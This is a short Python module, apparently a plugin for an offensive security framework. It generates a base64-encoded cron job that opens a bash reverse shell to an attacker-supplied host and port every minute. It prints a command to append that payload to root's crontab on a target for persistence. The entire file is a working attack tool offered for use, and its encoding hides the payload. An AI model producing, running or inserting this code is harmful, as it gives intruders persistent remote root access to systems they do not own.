"""Generate a base64-encoded reverse-shell cron job for persistence."""

import base64


def run(ctx):
    # Generate a simple reverse shell cron job
    payload = (
        f"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ctx.inputs.get('lhost')}/"
        f"{ctx.inputs.get('lport')} 0>&1'"
    )
    encoded = base64.b64encode(payload.encode()).decode()

    print("Cron job payload (base64):")
    print(encoded)
    print("\nExecute on target:")
    print(f"echo {encoded} | base64 -d >> /var/spool/cron/crontabs/root")
    ctx.add_outputs(payload=payload, encoded=encoded)
